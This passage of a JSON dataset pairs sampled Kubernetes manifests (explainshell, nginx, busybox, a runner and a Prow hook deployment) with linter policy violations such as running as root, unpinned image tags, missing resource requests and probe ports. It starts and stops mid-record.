    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: explainshell-deployment\n  namespace: explainshell\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: explainshell-web\n  template:\n    metadata:\n      labels:\n        app: explainshell-web\n    spec:\n      containers:\n      - env:\n        - name: HOST_IP\n          value: 0.0.0.0\n        - name: MONGO_URI\n          value: mongodb://mongo-database-0.mongodb-service.explainshell.svc.cluster.local\n        - name: PYTHONPATH\n          value: /opt/webapp\n        command:\n        - /bin/bash\n        - -c\n        - \"apt-get update\\napt-get install -y make gcc \\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man1/\\npython explainshell/manager.py --log\\\n          \\ info /usr/share/man/man3/\\npython explainshell/manager.py --log info /usr/share/man/man5/\\n\\\n          python explainshell/manager.py --log info /usr/share/man/man7/\\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man8/\\nexec make serve\\n\"\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/explainshell_web:v1.0.1\n        name: explainshell-web\n        ports:\n        - containerPort: 5000\n        resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"explainshell-web\" is not set to runAsNonRoot"
  },
  {
    "id": "11272",
    "manifest_path": "data/manifests/the_stack_sample/sample_4349.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: explainshell-deployment\n  namespace: explainshell\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: explainshell-web\n  template:\n    metadata:\n      labels:\n        app: explainshell-web\n    spec:\n      containers:\n      - env:\n        - name: HOST_IP\n          value: 0.0.0.0\n        - name: MONGO_URI\n          value: mongodb://mongo-database-0.mongodb-service.explainshell.svc.cluster.local\n        - name: PYTHONPATH\n          value: /opt/webapp\n        command:\n        - /bin/bash\n        - -c\n        - \"apt-get update\\napt-get install -y make gcc \\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man1/\\npython explainshell/manager.py --log\\\n          \\ info /usr/share/man/man3/\\npython explainshell/manager.py --log info /usr/share/man/man5/\\n\\\n          python explainshell/manager.py --log info /usr/share/man/man7/\\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man8/\\nexec make serve\\n\"\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/explainshell_web:v1.0.1\n        name: explainshell-web\n        ports:\n        - containerPort: 5000\n        resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"explainshell-web\" has cpu request 0"
  },
  {
    "id": "11273",
    "manifest_path": "data/manifests/the_stack_sample/sample_4349.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: explainshell-deployment\n  namespace: explainshell\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: explainshell-web\n  template:\n    metadata:\n      labels:\n        app: explainshell-web\n    spec:\n      containers:\n      - env:\n        - name: HOST_IP\n          value: 0.0.0.0\n        - name: MONGO_URI\n          value: mongodb://mongo-database-0.mongodb-service.explainshell.svc.cluster.local\n        - name: PYTHONPATH\n          value: /opt/webapp\n        command:\n        - /bin/bash\n        - -c\n        - \"apt-get update\\napt-get install -y make gcc \\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man1/\\npython explainshell/manager.py --log\\\n          \\ info /usr/share/man/man3/\\npython explainshell/manager.py --log info /usr/share/man/man5/\\n\\\n          python explainshell/manager.py --log info /usr/share/man/man7/\\npython explainshell/manager.py\\\n          \\ --log info /usr/share/man/man8/\\nexec make serve\\n\"\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/explainshell_web:v1.0.1\n        name: explainshell-web\n        ports:\n        - containerPort: 5000\n        resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"explainshell-web\" has memory limit 0"
  },
  {
    "id": "11274",
    "manifest_path": "data/manifests/the_stack_sample/sample_4351.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-app\nspec:\n  containers:\n  - name: nginx-app\n    image: nginx\n    resources:\n      limits:\n        cpu: 200m\n        memory: 500Mi\n      requests:\n        cpu: 100m\n        memory: 200Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-app\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11275",
    "manifest_path": "data/manifests/the_stack_sample/sample_4351.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-app\nspec:\n  containers:\n  - name: nginx-app\n    image: nginx\n    resources:\n      limits:\n        cpu: 200m\n        memory: 500Mi\n      requests:\n        cpu: 100m\n        memory: 200Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-app\" does not have a read-only root file system"
  },
  {
    "id": "11276",
    "manifest_path": "data/manifests/the_stack_sample/sample_4351.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-app\nspec:\n  containers:\n  - name: nginx-app\n    image: nginx\n    resources:\n      limits:\n        cpu: 200m\n        memory: 500Mi\n      requests:\n        cpu: 100m\n        memory: 200Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-app\" is not set to runAsNonRoot"
  },
  {
    "id": "11277",
    "manifest_path": "data/manifests/the_stack_sample/sample_4354.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: test-job\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox\n          command:\n          - echo\n          - Hello Kubernetes Job\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hello\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11278",
    "manifest_path": "data/manifests/the_stack_sample/sample_4354.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: test-job\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox\n          command:\n          - echo\n          - Hello Kubernetes Job\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello\" does not have a read-only root file system"
  },
  {
    "id": "11279",
    "manifest_path": "data/manifests/the_stack_sample/sample_4354.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: test-job\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox\n          command:\n          - echo\n          - Hello Kubernetes Job\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello\" is not set to runAsNonRoot"
  },
  {
    "id": "11280",
    "manifest_path": "data/manifests/the_stack_sample/sample_4354.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: test-job\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox\n          command:\n          - echo\n          - Hello Kubernetes Job\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello\" has cpu request 0"
  },
  {
    "id": "11281",
    "manifest_path": "data/manifests/the_stack_sample/sample_4354.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: test-job\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: hello\n          image: busybox\n          command:\n          - echo\n          - Hello Kubernetes Job\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello\" has memory limit 0"
  },
  {
    "id": "11282",
    "manifest_path": "data/manifests/the_stack_sample/sample_4355.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: runner-debug-deployment\n  labels:\n    app: runner-debug\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: runner-debug\n  template:\n    metadata:\n      labels:\n        app: runner-debug\n    spec:\n      containers:\n      - name: runner\n        image: starcoin/starcoin-runner:v2.275.1.20210111\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - while true; do sleep 10 ; echo \"sleep\"; done;\n      serviceAccountName: github-runner\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"runner\" does not have a read-only root file system"
  },
  {
    "id": "11283",
    "manifest_path": "data/manifests/the_stack_sample/sample_4355.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: runner-debug-deployment\n  labels:\n    app: runner-debug\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: runner-debug\n  template:\n    metadata:\n      labels:\n        app: runner-debug\n    spec:\n      containers:\n      - name: runner\n        image: starcoin/starcoin-runner:v2.275.1.20210111\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - while true; do sleep 10 ; echo \"sleep\"; done;\n      serviceAccountName: github-runner\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"github-runner\" not found"
  },
  {
    "id": "11284",
    "manifest_path": "data/manifests/the_stack_sample/sample_4355.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: runner-debug-deployment\n  labels:\n    app: runner-debug\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: runner-debug\n  template:\n    metadata:\n      labels:\n        app: runner-debug\n    spec:\n      containers:\n      - name: runner\n        image: starcoin/starcoin-runner:v2.275.1.20210111\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - while true; do sleep 10 ; echo \"sleep\"; done;\n      serviceAccountName: github-runner\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"runner\" is not set to runAsNonRoot"
  },
  {
    "id": "11285",
    "manifest_path": "data/manifests/the_stack_sample/sample_4355.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: runner-debug-deployment\n  labels:\n    app: runner-debug\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: runner-debug\n  template:\n    metadata:\n      labels:\n        app: runner-debug\n    spec:\n      containers:\n      - name: runner\n        image: starcoin/starcoin-runner:v2.275.1.20210111\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - while true; do sleep 10 ; echo \"sleep\"; done;\n      serviceAccountName: github-runner\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"runner\" has cpu request 0"
  },
  {
    "id": "11286",
    "manifest_path": "data/manifests/the_stack_sample/sample_4355.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: runner-debug-deployment\n  labels:\n    app: runner-debug\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: runner-debug\n  template:\n    metadata:\n      labels:\n        app: runner-debug\n    spec:\n      containers:\n      - name: runner\n        image: starcoin/starcoin-runner:v2.275.1.20210111\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        args:\n        - while true; do sleep 10 ; echo \"sleep\"; done;\n      serviceAccountName: github-runner\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"runner\" has memory limit 0"
  },
  {
    "id": "11287",
    "manifest_path": "data/manifests/the_stack_sample/sample_4356.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20211013-f0462bffd3\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11288",
    "manifest_path": "data/manifests/the_stack_sample/sample_4356.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20211013-f0462bffd3\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11289",
    "manifest_path": "data/manifests/the_stack_sample/sample_4356.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20211013-f0462bffd3\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "11290",
    "manifest_path": "data/manifests/the_stack_sample/sample_4356.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20211013-f0462bffd3\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "11291",
    "manifest_path": "data/manifests/the_stack_sample/sample_4356.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20211013-f0462bffd3\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11292",
    "manifest_path": "data/manifests/the_stack_sample/sample_4356.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20211013-f0462bffd3\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "11293",
    "manifest_path": "data/manifests/the_stack_sample/sample_4356.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20211013-f0462bffd3\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "11294",
    "manifest_path": "data/manifests/the_stack_sample/sample_4356.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20211013-f0462bffd3\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          